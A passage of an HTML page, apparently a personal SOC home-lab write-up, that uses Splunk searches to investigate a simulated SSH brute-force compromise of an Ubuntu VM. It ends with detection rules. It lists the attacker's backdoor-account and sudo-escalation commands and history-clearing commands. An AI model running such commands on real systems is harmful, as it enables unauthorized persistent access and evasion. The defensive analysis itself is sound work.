+        <div class="splunk-query"><span class="kw">index</span>=main <span class="kw">host</span>="ubuntu" <span class="kw">source</span>="/var/log/auth.log" (add member OR to group)
+<span class="pipe">|</span> <span class="kw">table</span> _time, _raw</div>
+      </div>
+
+      <!-- Figure 8 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 08 · SPLUNK GROUP MEMBERSHIP SEARCH
+          </span>
+          <span class="cs-figure-meta">splunk_group_membership.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/splunk_group_membership.png" alt="Splunk Group Membership Search" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 8:</strong> Splunk search surfacing 12 group modification events, differentiating legitimate baseline setup activity from adversary actions.
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Baseline vs. Malicious Findings (Search 3a Results)
+        </div>
+        <ul>
+          <li><strong>Returned 12 events total.</strong></li>
+          <li>Splunk surfaced both legitimate baseline setup activity (<code>add 'ubuntu' to shadow group 'wireshark'</code> at <code>10:13:58</code>) and the attack activity (<code>add 'hacker' to group 'sudo'</code>).</li>
+        </ul>
+      </div>
+
+      <p>To focus purely on the intruder's account, I filtered directly on the username <code>hacker</code>:</p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          SPL Hunt 03b · Isolated Privilege Escalation to Sudo
+        </div>
+        <div class="splunk-query"><span class="kw">index</span>=main <span class="kw">host</span>="ubuntu" <span class="kw">source</span>="/var/log/auth.log" (add member OR to group) hacker
+<span class="pipe">|</span> <span class="kw">table</span> _time, _raw</div>
+      </div>
+
+      <!-- Figure 9 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 09 · SPLUNK SUDO PRIVILEGE ESCALATION
+          </span>
+          <span class="cs-figure-meta">splunk_privesc_sudo.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/splunk_privesc_sudo.png" alt="Splunk Sudo Group Privilege Escalation" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 9:</strong> Filtered search isolating 6 events confirming account <code>hacker</code> added to the shadow group <code>sudo</code>.
+        </figcaption>
+      </figure>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Result: Isolated 6 Events Confirming Privilege Escalation
+        </div>
+        <div class="terminal-block terminal-out-block" style="margin:12px 0;">
+          <div class="terminal-bar">
+            <div class="terminal-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+            <span class="terminal-title">auth.log · Isolated Sudo Privilege Escalation Event</span>
+            <span class="terminal-badge terminal-badge-log">RAW SYSLOG</span>
+          </div>
+          <div class="terminal-code" style="font-size:12px;">2026-10-02 17:53:47.739 ubuntu usermod[5705]: <span class="highlight">add 'hacker' to shadow group 'sudo'</span>
+2026-10-02 17:53:47.736 ubuntu usermod[5705]: <span class="highlight">add 'hacker' to group 'sudo'</span></div>
+        </div>
+      </div>
+
+      <!-- Search 4 -->
+      <h3 style="font-size:16px; margin:24px 0 12px; color:var(--text);">Search 4: Reconstructing the Complete Sudo Command Timeline</h3>
+      <p>
+        To reconstruct the exact commands executed as root without relying on shell history files (which an attacker can clear), I targeted audit lines logged by <code>sudo</code> using regex extraction:
+      </p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          SPL Hunt 04 · Complete Command Line Sequence Reconstruction
+        </div>
+        <div class="splunk-query"><span class="kw">index</span>=main <span class="kw">host</span>="ubuntu" <span class="kw">source</span>="/var/log/auth.log" "command=" hacker
+<span class="pipe">|</span> <span class="kw">rex</span> field=_raw "USER=(?&lt;run_as&gt;\S+) ; COMMAND=(?&lt;executed_command&gt;.*)"
+<span class="pipe">|</span> <span class="kw">table</span> _time, USER, run_as, executed_command</div>
+      </div>
+
+      <!-- Figure 10 -->
+      <figure class="cs-figure">
+        <div class="cs-figure-header">
+          <span class="cs-figure-title">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+            EVIDENCE 10 · SPLUNK SUDO COMMAND EXECUTION TIMELINE
+          </span>
+          <span class="cs-figure-meta">splunk_command_timeline.png</span>
+        </div>
+        <div class="cs-figure-img-wrap">
+          <img src="/static/img/soc-ubuntu/splunk_command_timeline.png" alt="Splunk Executed Command Timeline" loading="lazy">
+        </div>
+        <figcaption class="cs-caption">
+          <strong>Figure 10:</strong> Splunk query reconstructing the complete post-exploitation command execution sequence via plaintext sudo audit entries.
+        </figcaption>
+      </figure>
+
+      <div class="cs-table-wrap">
+        <table class="cs-table">
+          <thead>
+            <tr>
+              <th>Timestamp</th>
+              <th>Process User</th>
+              <th>Executed As (run_as)</th>
+              <th>Executed Command</th>
+              <th>TTP / Forensic Context</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td class="mono">17:51:22.856</td>
+              <td><code>root</code></td>
+              <td><code>root</code></td>
+              <td class="mono">/usr/sbin/useradd hacker</td>
+              <td><strong>Persistence:</strong> Backdoor account created</td>
+            </tr>
+            <tr>
+              <td class="mono">17:52:58.928</td>
+              <td><code>root</code></td>
+              <td><code>root</code></td>
+              <td class="mono">/usr/sbin/groupmod hacker sudo</td>
+              <td><strong>Privilege Escalation:</strong> Failed syntax attempt</td>
+            </tr>
+            <tr>
+              <td class="mono">17:53:47.707</td>
+              <td><code>root</code></td>
+              <td><code>root</code></td>
+              <td class="mono">/usr/sbin/usermod -aG sudo hacker</td>
+              <td><strong>Privilege Escalation:</strong> Succeeded; added to sudoers</td>
+            </tr>
+            <tr>
+              <td class="mono">17:54:41.131</td>
+              <td><code>root</code></td>
+              <td><code>root</code></td>
+              <td class="mono">/usr/sbin/adduser hacker sudo</td>
+              <td><strong>Verification:</strong> Redundant attempt to ensure sudo access</td>
+            </tr>
+            <tr>
+              <td class="mono">17:56:15.128</td>
+              <td><code>root</code></td>
+              <td><code>root</code></td>
+              <td class="mono">/usr/bin/su -hacker</td>
+              <td><strong>Lateral Movement:</strong> Attempted to switch into new account</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="result-box">
+        <div class="result-box-title">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Timeline Reconstruction Results
+        </div>
+        <p>
+          This SPL search surfaced <strong>15 matching events</strong>, demonstrating how a SOC analyst can rebuild the attacker's complete post-exploitation command line sequence purely from forwarded syslog data without relying on shell history files (which an attacker can easily clear with <code>history -c</code> or <code>unset HISTFILE</code>).
+        </p>
+      </div>
+    </section>
+
+    <!-- 06 KEY FINDINGS & TAKEAWAYS -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">06</span>
+        <h2>Key Findings &amp; Investigation Takeaways</h2>
+      </div>
+      <ul>
+        <li><strong>Weak passwords break perimeter defenses in seconds:</strong> Simple dictionary lists cracked <code>ubuntu:sudosu</code> near-instantly. Mandatory public-key authentication (disabling password authentication in <code>sshd_config</code>) is non-negotiable.</li>
+        <li><strong>Built-in OpenSSH rate-limiting is not a replacement for active banning:</strong> Modern Ubuntu OpenSSH implements <code>srclimit_penalise</code> (17-second progressive delay), but does not ban offending IPs permanently. Automated tools like Hydra easily absorb these delays and eventually compromise the system. Active tooling like Fail2ban or firewall rate-limiting is required.</li>
+        <li><strong>Packet captures and host logs must be correlated:</strong> Wireshark captures traffic volume and connection velocity, but payload encryption blinds analysts to command execution. Endpoint syslog telemetry (<code>auth.log</code>) is required to understand true operational impact.</li>
+        <li><strong>Dynamic regex parsing (rex) is essential for unstructured text logs:</strong> Unstructured log lines require flexible SIEM parsing. Splunk's <code>rex</code> command allows tier-1 analysts to extract ad-hoc fields on the fly without waiting for pipeline schema re-indexing.</li>
+        <li><strong>User creation combined with sudo elevation is a critical attack signal:</strong> Any occurrence of <code>useradd</code> immediately followed by <code>usermod -aG sudo</code> within an active remote SSH session warrants immediate high-priority SOC escalation.</li>
+      </ul>
+    </section>
+
+    <!-- 07 DETECTION RULES FOR PRODUCTION SIEMS -->
+    <section class="cs-sec">
+      <div class="cs-sec-head">
+        <span class="cs-sec-tag">07</span>
+        <h2>Detection Engineering &amp; Production SIEM Rules</h2>
+      </div>
+      <p>
+        Actionable, high-fidelity detection rules developed from this lab exercise ready for deployment into enterprise SOC SIEM environments:
+      </p>
+
+      <div class="splunk-box">
+        <div class="splunk-title">1. SSH Brute-Force Activity (High Frequency)</div>
+        <div class="splunk-query"><span class="kw">index</span>=* <span class="kw">source</span>="/var/log/auth.log" "Failed password"
+<span class="pipe">|</span> <span class="kw">rex</span> field=_raw "from (?&lt;src_ip&gt;\d+\.\d+\.\d+\.\d+)"
+<span class="pipe">|</span> <span class="kw">stats</span> count by src_ip
+<span class="pipe">|</span> <span class="kw">where</span> count > 10</div>
+      </div>
+
+      <div class="splunk-box">
+        <div class="splunk-title">2. Privilege Escalation to Sudo Group</div>
+        <div class="splunk-query"><span class="kw">index</span>=* <span class="kw">source</span>="/var/log/auth.log" ("add member" OR "to group") AND ("sudo" OR "wheel" OR "admin")
+<span class="pipe">|</span> <span class="kw">table</span> _time, host, _raw</div>
+      </div>
+
+      <div class="splunk-box">
+        <div class="splunk-title">3. Suspicious New User Creation</div>
+        <div class="splunk-query"><span class="kw">index</span>=* <span class="kw">source</span>="/var/log/auth.log" "useradd" "new user:"
+<span class="pipe">|</span> <span class="kw">rex</span> field=_raw "name=(?&lt;created_user&gt;\w+)"
+<span class="pipe">|</span> <span class="kw">table</span> _time, host, created_user, _raw</div>
+      </div>
+
+      <div class="splunk-box">
+        <div class="splunk-title">4. Repeated Failed su Attempts</div>
+        <div class="splunk-query"><span class="kw">index</span>=* <span class="kw">source</span>="/var/log/auth.log" "FAILED SU"
+<span class="pipe">|</span> <span class="kw">stats</span> count by host, _raw</div>
+      </div>
+
+      <!-- DISCLAIMER -->
+      <div class="callout" style="margin-top:36px;">
+        <div class="callout-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+          Disclaimer
+        </div>
+        <p>
+          This lab was conducted entirely within an isolated, self-hosted virtual lab environment for educational and defense-focused learning purposes only.
+        </p>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="cs-footer">
+    <a href="/pages/soc-windows-home-lab.html" class="btn-back">
+      ← previous lab: Windows SOC Lab
+    </a>
+    <a href="/#homelabs" class="btn-back">
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+      cd .. / return to overview
+    </a>
+    <a href="/pages/niri-dotfiles.html" class="btn-back">
+      next lab: niri Dotfiles →
+    </a>
+  </footer>
+
+</div>
+
+<!-- SCROLL PROGRESS INDICATOR -->
+<div class="scroll-progress-line" id="scroll-progress-line" aria-hidden="true"></div>
+
+<script src="/static/loader.js?v=2.3" defer></script>
+</body>
+</html>
